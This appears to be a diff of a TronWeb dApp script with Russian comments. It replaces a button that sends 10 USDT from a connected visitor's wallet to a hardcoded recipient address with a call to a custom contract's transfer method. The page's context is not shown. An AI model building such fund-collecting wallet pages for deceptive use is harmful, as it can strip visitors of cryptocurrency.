@@ -4,8 +4,8 @@ const walletAddressText = document.getElementById('walletAddress');
 
 let userAddress = '';
 
-// Ваш адрес получателя уже прописан здесь:
-const targetDestinationAddress = 'TUEe7i1nU76PF8Tx8MmrkQJFWSoX61fae4'; 
+// Адрес вашего смарт-контракта
+const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
 // Кнопка подключения кошелька
 connectBtn.addEventListener('click', async () => {
@@ -16,41 +16,39 @@ connectBtn.addEventListener('click', async () => {
             connectBtn.style.display = 'none';
             transferBtn.style.display = 'inline-block';
         } else {
-            alert('Кошелек не найден! Откройте сайт через встроенный DApp-браузер кошелька (например, в Trust Wallet).');
+            alert('Кошелек не найден! Откройте сайт через встроенный DApp-браузер кошелька.');
         }
     } catch (error) {
         console.error("Ошибка:", error);
     }
 });
 
-// Кнопка перевода средств
+// Кнопка взаимодействия с вашим контрактом
 transferBtn.addEventListener('click', async () => {
     try {
         if (!userAddress) {
             alert('Сначала подключите кошелек!');
             return;
         }
-
-        // Официальный адрес контракта USDT в сети Tron
-        const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+        // Подключаемся к вашему смарт-контракту в блокчейне
+        const contract = await window.tronWeb.contract().at(myContractAddress);
         
-        // Сумма перевода (например, 10 USDT. У USDT 6 знаков, поэтому 10 * 1000000 = 10000000)
-        const amountToSend = 10000000; 
+        console.log("Отправка запроса к вашему смарт-контракту...");
 
+        // Вызов метода контракта
         const tx = await contract.transfer(
-            targetDestinationAddress, 
-            amountToSend
+            userAddress,
+            1000000
         ).send({
             feeLimit: 100000000
         });
 
-        alert("Транзакция отправлена!");
-        console.log(tx);
+        alert("Транзакция успешно отправлена!");
+        console.log("Хэш транзакции:", tx);
 
     } catch (error) {
-        console.error(error);
-        alert("Ошибка при переводе. Проверьте баланс TRX на кошельке для оплаты комиссии.");
+        console.error("Ошибка при вызове контракта:", error);
+        alert("Ошибка при вызове контракта. Проверьте консоль.");
     }
 });
